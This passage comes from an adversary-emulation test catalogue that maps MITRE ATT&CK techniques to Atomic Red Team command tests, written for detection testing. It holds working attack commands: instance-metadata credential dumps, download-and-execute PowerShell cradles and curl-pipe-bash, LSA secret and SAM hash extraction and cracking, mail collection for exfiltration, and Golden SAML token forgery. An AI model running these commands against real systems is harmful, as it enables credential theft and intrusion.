instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n", "atomic_tests": [{"name": "Azure - Search Azure AD User Attributes for Passwords", "auto_generated_guid": "ae9b2e3e-efa1-4483-86e2-fae529ab9fb6", "description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": null}, "password": {"description": "Azure AD password", "type": "string", "default": "T1082Az"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The MSOnline module must be installed.\n", "prereq_command": "if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}\n", "get_prereq_command": "install-module MSOnline\n"}], "executor": {"command": "import-module msonline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n", "cleanup_command": "remove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": true}}, {"name": "Azure - Dump Azure Instance Metadata from Virtual Machines", "auto_generated_guid": "cc99e772-4e18-4f1f-b422-c5cdd1bfd7b7", "description": "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n", "supported_platforms": ["iaas:azure"], "input_arguments": {"output_file": {"description": "File to output metadata to", "type": "string", "default": "$env:temp\\T1552.005Test2.txt"}}, "executor": {"command": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > #{output_file}\n", "cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\n", "name": "powershell"}}]}, "T1615": {"name": "Group Policy Discovery", "technique_id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b", "external_id": "T1615", "data_components": ["Command Execution", "Process Creation", "Active Directory Object Access", "Script Execution", "Network Traffic Content"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.", "atomic_tests": [{"name": "Display group policy information via gpresult", "auto_generated_guid": "0976990f-53b1-4d3f-a185-6df5be429d3b", "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "gpresult /z\n"}}, {"name": "Get-DomainGPO to display group policy information via PowerView", "auto_generated_guid": "4e524c4e-0e02-49aa-8df5-93f3f7959b9f", "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.", "supported_platforms": ["windows"], "executor": {"command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"", "name": "powershell", "elevation_required": true}}, {"name": "WinPwn - GPOAudit", "auto_generated_guid": "bc25c04b-841e-4965-855f-d1f645d7ab73", "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "WinPwn - GPORemoteAccessPolicy", "auto_generated_guid": "7230d01a-0a72-4bd5-9d7f-c6d472bc6a59", "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "MSFT Get-GPO Cmdlet", "auto_generated_guid": "52778a8f-a10b-41a4-9eae-52ddb74072bf", "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps", "supported_platforms": ["windows"], "input_arguments": {"gpo_output": {"description": "The output of the Get-GPO cmdlet", "type": "string", "default": "$env:temp\\GPO_Output.txt"}, "gpo_param": {"description": "You can specify a GPO by its display name or by its globally unique identifier (GUID) to get a single GPO, or you can get all the GPOs in the domain through the All parameter", "type": "string", "default": "-All"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Add Rsat.ActiveDirectory.DS", "prereq_command": "if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }", "get_prereq_command": "Add-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"}, {"description": "Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed for this to work on Win10, WinServer 2019 works by default. This will take a long time (almost 2 minutes) to install RSAT Manually###.", "prereq_command": "if(Get-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }", "get_prereq_command": "Add-WindowsCapability -online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0"}], "executor": {"command": "Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}", "cleanup_command": "del $env:temp\\GPO_Output.txt -erroraction silentlycontinue", "name": "powershell", "elevation_required": true}}]}, "T1074.001": {"name": "Local Data Staging", "technique_id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c", "external_id": "T1074.001", "data_components": ["File Access", "Windows Registry Key Modification", "Command Execution", "File Creation"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)", "atomic_tests": [{"name": "Stage data from Discovery.bat", "auto_generated_guid": "107706a5-6f9f-451a-adae-bab8c667829f", "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Location to save downloaded discovery.bat file", "type": "path", "default": "$env:TEMP\\discovery.bat"}}, "executor": {"command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n", "cleanup_command": "Remove-Item -Force #{output_file} -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Stage data from Discovery.sh", "auto_generated_guid": "39ce0303-ae16-4b9e-bb5b-4f53e8262066", "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Location to save downloaded discovery.bat file", "type": "path", "default": "/tmp/T1074.001_discovery.log"}}, "executor": {"command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > #{output_file}\n", "name": "bash"}}, {"name": "Stage data from Discovery.sh (freebsd)", "auto_generated_guid": "4fca7b49-379d-4493-8890-d6297750fa46", "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Location to save downloaded discovery.bat file", "type": "path", "default": "/tmp/T1074.001_discovery.log"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if curl is installed.\n", "prereq_command": "if [ ! -x \"$(command -v curl)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y curl)\n"}], "executor": {"command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n", "name": "sh"}}, {"name": "Zip a Folder with PowerShell for Staging in Temp", "auto_generated_guid": "a57fbe4b-3440-452a-88a7-943531ac872a", "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Location to save zipped file or folder", "type": "path", "default": "$env:TEMP\\Folder_to_zip.zip"}, "input_file": {"description": "Location of file or folder to zip", "type": "path", "default": "PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip"}}, "executor": {"command": "Compress-Archive -Path \"#{input_file}\" -DestinationPath #{output_file} -Force\n", "cleanup_command": "Remove-Item -Path #{output_file} -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1036.005": {"name": "Match Legitimate Name or Location", "technique_id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2", "external_id": "T1036.005", "data_components": ["File Metadata", "Process Metadata", "Image Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.", "atomic_tests": [{"name": "Execute a process from a directory masquerading as the current parent directory.", "auto_generated_guid": "812c3ab8-94b0-4698-a9bf-9420af23ce24", "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"test_message": {"description": "Test message to echo out to the screen", "type": "string", "default": "Hello from the Atomic Red Team test T1036.005#1"}}, "executor": {"name": "sh", "elevation_required": false, "command": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo #{test_message}\"\n", "cleanup_command": "rm -f $HOME/.../sh\nrmdir $HOME/.../\n"}}, {"name": "Masquerade as a built-in system executable", "auto_generated_guid": "35eb8d16-9820-4423-a2a1-90c4f5edd9ca", "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n", "supported_platforms": ["windows"], "input_arguments": {"executable_filepath": {"description": "File path where the generated executable will be dropped and executed from. The filename should be the name of a built-in system utility.", "type": "string", "default": "$Env:windir\\Temp\\svchost.exe"}}, "executor": {"command": "Add-Type -TypeDefinition @'\npublic class Test {\n    public static void Main(string[] args) {\n        System.Console.WriteLine(\"tweet, tweet\");\n    }\n}\n'@ -OutputAssembly \"#{executable_filepath}\"\n\nStart-Process -FilePath \"#{executable_filepath}\"\n", "cleanup_command": "Remove-Item -Path \"#{executable_filepath}\" -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1110.002": {"name": "Password Cracking", "technique_id": "attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d", "external_id": "T1110.002", "data_components": ["User Account Authentication", "Application Log Content"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.", "atomic_tests": [{"name": "Password Cracking with Hashcat", "auto_generated_guid": "6d27df5d-69d4-4c91-bc33-5983ffe91692", "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against", "supported_platforms": ["windows"], "input_arguments": {"hashcat_exe": {"description": "Path to Hashcat executable", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe"}, "input_file_sam": {"description": "Path to SAM file", "type": "string", "default": "PathToAtomicsFolder\\T1110.002\\src\\sam.txt"}, "input_file_passwords": {"description": "Path to password list", "type": "string", "default": "PathToAtomicsFolder\\T1110.002\\src\\password.lst"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Hashcat must exist on disk at specified location (#{hashcat_exe})", "prereq_command": "if (Test-Path  $(cmd /c echo \"#{hashcat_exe}\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.7-zip.org/a/7z1900.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z1900.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z1900.exe\" -ArgumentList \"/S /D=PathToAtomicsFolder\\..\\ExternalPayloads\\7zi\" -NoNewWindow\nInvoke-WebRequest \"https://hashcat.net/files/hashcat-6.1.1.7z\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6.7z\"\nStart-Process cmd.exe -Args  \"/c %temp%\\7z\\7z.exe x %temp%\\hashcat6.7z -aoa -o%temp%\\hashcat-unzip\" -Wait\nNew-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null\nMove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat-unzip\\hashcat-6.1.1\\*\" $(cmd /c echo #{hashcat_exe}\\..) -Force -ErrorAction Ignore"}], "executor": {"command": "cd #{hashcat_exe}\\..\n#{hashcat_exe} -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}", "cleanup_command": "del \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6.7z\" >nul 2>&1\ndel \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z1900.exe\" >nul 2>&1\ndel \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z\" /Q /S >nul 2>&1\ndel \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat-unzip\" /Q /S >nul 2>&1", "name": "command_prompt", "elevation_required": true}}]}, "T1114.001": {"name": "Local Email Collection", "technique_id": "attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004", "external_id": "T1114.001", "data_components": ["Command Execution", "File Access"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": ["course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)", "atomic_tests": [{"name": "Email Collection with PowerShell Get-Inbox", "auto_generated_guid": "3f1b5096-0139-4736-9b78-19bcb02bb1cb", "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Output file path", "type": "string", "default": "$env:TEMP\\mail.csv"}, "file_path": {"description": "File path for Get-Inbox.ps1", "type": "string", "default": "PathToAtomicsFolder\\T1114.001\\src"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Get-Inbox.ps1 must be located at #{file_path}\n", "prereq_command": "if (Test-Path \"#{file_path}\\Get-Inbox.ps1\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1\" -OutFile \"#{file_path}\\Get-Inbox.ps1\"\n"}], "executor": {"command": "powershell -executionpolicy bypass -command \"#{file_path}\\Get-Inbox.ps1\" -file #{output_file}\n", "cleanup_command": "Remove-Item #{output_file} -Force -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1555.001": {"name": "Keychain", "technique_id": "attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3", "external_id": "T1555.001", "data_components": ["File Access", "Command Execution", "Process Creation", "OS API Execution"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485"], "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ", "atomic_tests": [{"name": "Keychain", "auto_generated_guid": "1864fdec-ff86-4452-8c30-f12507582a93", "description": "### Keychain Files\n\n  ~/Library/Keychains/\n\n  /Library/Keychains/\n\n  /Network/Library/Keychains/\n\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n\n  [Keychain dumper](https://github.com/juuso/keychaindump)\n", "supported_platforms": ["macos"], "input_arguments": {"cert_export": {"description": "Specify the path of the certificates to export.", "type": "path", "default": "/tmp/certs.pem"}}, "executor": {"command": "security -h\nsecurity find-certificate -a -p > #{cert_export}\nsecurity import #{cert_export} -k\n", "name": "sh"}}]}, "T1547": {"name": "Boot or Logon Autostart Execution", "technique_id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf", "external_id": "T1547", "data_components": ["File Modification", "File Creation", "OS API Execution", "Windows Registry Key Modification", "Driver Load", "Module Load", "Process Creation", "Windows Registry Key Creation", "Command Execution", "Kernel Module Load"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.", "atomic_tests": [{"name": "Add a driver", "auto_generated_guid": "cb01b3da-b0e7-4e24-bf6d-de5223526785", "description": "Install a driver via pnputil.exe lolbin\n", "supported_platforms": ["windows"], "input_arguments": {"driver_inf": {"description": "A built-in, already installed windows driver inf", "type": "path", "default": "C:\\Windows\\INF\\usbstor.inf"}}, "executor": {"command": "pnputil.exe /add-driver \"#{driver_inf}\"\n", "name": "command_prompt"}}]}, "T1003.004": {"name": "LSA Secrets", "technique_id": "attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc", "external_id": "T1003.004", "data_components": ["Windows Registry Key Access", "Command Execution"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)", "atomic_tests": [{"name": "Dumping LSA Secrets", "auto_generated_guid": "55295ab0-a703-433b-9ca4-ae13807de12f", "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n", "supported_platforms": ["windows"], "input_arguments": {"psexec_exe": {"description": "Path to PsExec executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})", "prereq_command": "if (Test-Path \"#{psexec_exe}\") {exit 0} else {exit 1}", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe\" \"#{psexec_exe}\" -Force"}], "executor": {"command": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y\n", "cleanup_command": "del %temp%\\secrets >nul 2> nul", "name": "command_prompt", "elevation_required": true}}]}, "T1606.002": {"name": "SAML Tokens", "technique_id": "attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2", "external_id": "T1606.002", "data_components": ["Web Credential Creation", "Web Credential Usage", "Logon Session Metadata", "Logon Session Creation", "User Account Authentication"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462"], "description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)\n\nAn adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)", "atomic_tests": [{"name": "Golden SAML", "auto_generated_guid": "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31", "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n", "supported_platforms": ["azure-ad"], "input_arguments": {"certificate_path": {"description": "Token signing certificate path. See T1552.004 to export it", "type": "path", "default": ".\\ADFS_signing.pfx"}, "immutable_id": {"description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId", "type": "string", "default": "aehgdqBTZV50DKQZmNJ8mg=="}, "issuer_uri": {"description": "Issuer URI of the ADFS service", "type": "string", "default": "http://contoso.com/adfs/services/trust/"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AADInternals module must be installed.\n", "prereq_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n", "get_prereq_command": "Install-Module -Name AADInternals -Force\n"}], "executor": {"command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer 